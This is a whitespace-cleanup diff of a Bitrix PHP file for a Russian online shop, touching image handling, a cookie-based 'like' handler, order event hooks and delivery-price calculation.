             $xmlID = $xml[1];
 
             //делаем запрос в соответствующий HL блок
-            $hlbl = 3; //"ID  Highload инфоблока" 
-            $hlblock = HL\HighloadBlockTable::getById($hlbl)->fetch();  
-            // get entity 
-            $entity = HL\HighloadBlockTable::compileEntity($hlblock); 
+            $hlbl = 3; //"ID  Highload инфоблока"
+            $hlblock = HL\HighloadBlockTable::getById($hlbl)->fetch();
+            // get entity
+            $entity = HL\HighloadBlockTable::compileEntity($hlblock);
 
             $main_query = new Entity\Query($entity);
 
             $select = array("UF_NEOTOBRAZHATNASAY");
             $main_query->setSelect($select);
 
-            $filter= array("UF_XML_ID"=>$xmlID);                
+            $filter= array("UF_XML_ID"=>$xmlID);
             $main_query->setFilter($filter);
 
             $result = $main_query->exec();
-            $result = new CDBResult($result); 
+            $result = new CDBResult($result);
 
             if ($result->SelectedRowsCount() === 1)
             {
@@ -3097,11 +3100,11 @@
             else {
                 return "N";
             }
-        }  
+        }
     }
 
 
-    //получаем массив с ключами равными постфиксу картинки (mini,maxi,midi), где  
+    //получаем массив с ключами равными постфиксу картинки (mini,maxi,midi), где
     //каждый элемент является описанием файла с нужной картинкой
     //xml_id = <xml_id товара>#<xml_id торг предлож>
     function GetImgNameArray($xml_id)
@@ -3109,13 +3112,13 @@
         $fileName=str_replace('#','_',$xml_id);
 
 
-        $keys = array("MINI", "MIDI", "MAXI"); //постфиксы картинок 
+        $keys = array("MINI", "MIDI", "MAXI"); //постфиксы картинок
 
         $result=array();
         foreach ($keys as $key)
         {
 
-            $fullName = $fileName."_".$key.".jpg";              
+            $fullName = $fileName."_".$key.".jpg";
             // $fileNameToSave= "img_import/new_img/".$fileName."_".$key.".jpg"; //относительно папки upload
             $fileNameToSave= "img_import/new_img/"; //относительно папки upload
             $absoluteName=$_SERVER["DOCUMENT_ROOT"]."/upload/img_import/img/".$fileName."_".$key.".jpg";  //абсолютный путь
@@ -3123,12 +3126,12 @@
             $resDB=CFile::GetList(array(),array("ORIGINAL_NAME" => $fullName));
 
             //если файл не зареген в базе, то регистрируем и сохраняем в папке img_new
-            //существующий файл после этого удаляется    
+            //существующий файл после этого удаляется
             if ( $resDB->SelectedRowsCount() === 0 )
-            {   
+            {
                 if (file_exists($absoluteName))
                 {
-                    $fileArray = CFile::MakeFileArray($absoluteName); 
+                    $fileArray = CFile::MakeFileArray($absoluteName);
 
                     $addFileArray = array(); //добавить параметры
 
@@ -3143,7 +3146,7 @@
             }
             //файл в базе зареген
             else
-            {  
+            {
                 $res=$resDB->Fetch();
                 $result[$key] = CFile::GetFileArray($res["ID"]);
             }
@@ -3151,14 +3154,14 @@
 
 
         }
-        return $result;                            
+        return $result;
     }
 
 
     /**
     * @param string $fileName
     * @return string|void
-    * 
+    *
     * */
 
     function isMinifiedExist($fileName){
@@ -3176,45 +3179,45 @@
     * @param int|float $width - opional
     * @param int|float $height - opional
     * @return string $path
-    * 
+    *
     * */
 
     function getResizedIMGPath($xml_id,$width,$height){
         $fileName = str_replace('#','_',$xml_id);
 
-        $path=isMinifiedExist($fileName);   
+        $path=isMinifiedExist($fileName);
         //arshow($path,true);
         $fileCheck = getimagesize($_SERVER["DOCUMENT_ROOT"].$path);
 
         // arshow($width,true);
         if(!$path || ($fileCheck[0] != $width || $fileCheck[1] != $height)){                     //
-            $keys = array("MAXI"); //постфиксы картинок    , "MIDI", "MINI" 
+            $keys = array("MAXI"); //постфиксы картинок    , "MIDI", "MINI"
             $size = "";
-            $path_exist = false; 
+            $path_exist = false;
             foreach ($keys as $key) {
                 $absoluteName=$_SERVER["DOCUMENT_ROOT"]."/upload/img_import/img/".$fileName."_".$key.".jpg";
                 $size = $key;
-                //  
+                //
                 if (file_exists($absoluteName)){
                     $path_exist = true;
                     break;
                 }
             }
-            if($path_exist){  
+            if($path_exist){
                 $tmp_fold = $_SERVER["DOCUMENT_ROOT"]."/upload/catalog_resized/".$fileName."_".$size.".jpg";
 
 
                 $test =  CFile::ResizeImageFile(
-                    $absoluteName, 
-                    $tmp_fold, 
-                    array('width'=>$width, 'height'=>$height), 
+                    $absoluteName,
+                    $tmp_fold,
+                    array('width'=>$width, 'height'=>$height),
                     BX_RESIZE_IMAGE_PROPORTIONAL
                 );
                 // arshow($_SERVER, true);
                 $path = "http://www.mamingorodok.ru//upload/catalog_resized/".$fileName."_".$size.".jpg";
 
 
-                //unlink($absoluteName); //дописано 06.10 чтобы удалять исходные файлы и не захламлять сервер    
+                //unlink($absoluteName); //дописано 06.10 чтобы удалять исходные файлы и не захламлять сервер
             } else {
                 $path = "";
             }
@@ -3238,28 +3241,28 @@
                 $productID = intval($_COOKIE["idElemToLike"]);
 
                 $PROP = array();
-                $PROP["PRODUCT_ID"] = $productID;  
-                $PROP["STATUS"] = "41";      
-                $PROP["USER_ID"] = $fields["USER_ID"];        
+                $PROP["PRODUCT_ID"] = $productID;
+                $PROP["STATUS"] = "41";
+                $PROP["USER_ID"] = $fields["USER_ID"];
 
                 $arLoadProductArray = Array(
-                    "MODIFIED_BY"    => $fields["USER_ID"], 
-                    "IBLOCK_SECTION_ID" => false,          
+                    "MODIFIED_BY"    => $fields["USER_ID"],
+                    "IBLOCK_SECTION_ID" => false,
                     "IBLOCK_ID"      => 8,
                     "PROPERTY_VALUES"=> $PROP,
                     "NAME"           => $productID,
-                    "ACTIVE"         => "Y",            
+                    "ACTIVE"         => "Y",
                 );
 
                 $PRODUCT_ID = $el->Add($arLoadProductArray);
                 //  if($PRODUCT_ID = $el->Add($arLoadProductArray))
                 //  echo $PRODUCT_ID;
                 //  else
-                //  echo "Error: ".$el->LAST_ERROR; 
+                //  echo "Error: ".$el->LAST_ERROR;
                 setcookie('idElemToLike', "");
-                header('Location: '.$_COOKIE["hrefElemToLike"]);                
+                header('Location: '.$_COOKIE["hrefElemToLike"]);
             }
-        } 
+        }
     }
 
     //запрос на определение города при входе на сайт. код взят из модуля, но там он почему то не использовался.
@@ -3289,11 +3292,11 @@
 
     function sitemap_generate(){
 
-    }                           
+    }
 
     AddEventHandler("sale", "OnOrderNewSendEmail", "OnOrderUpdateHandler");   // событие срабатывающее после создания заказа
     function OnOrderUpdateHandler($ID,&$eventName,&$arFields)
-    { 
+    {
 
         $saleOrder = CSaleOrder::GetByID($ID);
         if(empty($arFields["ORDER_USER"])){
@@ -3301,7 +3304,7 @@
         }
         // $arOrder = CSaleOrderPropsValue::GetOrderProps($ID)->fetch();
         /*  array("SORT" => "ASC"),
-        array("ORDER_ID" => $ID)                                       
+        array("ORDER_ID" => $ID)
         );    */
         /* while ($arProps = $arOrder->Fetch()){
         $ar_prop[] = $arProps;
@@ -3321,7 +3324,7 @@
     }
     /*  AddEventHandler("main", "OnBeforeUserAdd", "OnBeforeUserRegisterHandler");
 
-    // описываем саму функцию 
+    // описываем саму функцию
     function OnBeforeUserRegisterHandler(&$args)
     {
 
@@ -3330,13 +3333,13 @@
     );
     $dbRes = CUser::GetList($by = 'ID', $order = 'ASC', $arFilter);
     while($res_user = $dbRes->Fetch()){
-    if (!empty($res_user)) 
+    if (!empty($res_user))
     {
     $email = date('U');
     $args["EMAIL"] = $email.'_'.$args["EMAIL"];
     $args["LOGIN"] = $email.'_'.$args["LOGIN"];
 
-    }  
+    }
     }
 
     return $args;
@@ -3344,7 +3347,7 @@
     }   */
 
     //Calculation delivery price for Yandex.Market
-    /* 
+    /*
     $productPrice - int,
     $arRules - array
     */
@@ -3353,23 +3356,23 @@
             if(!empty($rule["PROPERTY_PRICE_LOW_VALUE"])&&!empty($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                 if (intval($productPrice)>=intval($rule["PROPERTY_PRICE_LOW_VALUE"]) && intval($productPrice)<intval($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                     $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
-                } 
+                }
             } else if (!empty($rule["PROPERTY_PRICE_LOW_VALUE"])) {
                 if (intval($productPrice)>=intval($rule["PROPERTY_PRICE_LOW_VALUE"])) {
                     $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
-                } 
+                }
             } else if (!empty($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                 if (intval($productPrice)<=intval($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                     $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
-                } 
+                }
             }
         }
         return $deliveryCost;
     }
-    
+
     //подмена статуса N на u
     AddEventHandler("sale", "OnOrderAdd", "changeOrderStatus");
-    function changeOrderStatus($ID, $data) {   
+    function changeOrderStatus($ID, $data) {
         if ($data == "N" || is_array($data)) {
             CSaleOrder::StatusOrder($ID, "u");
         }
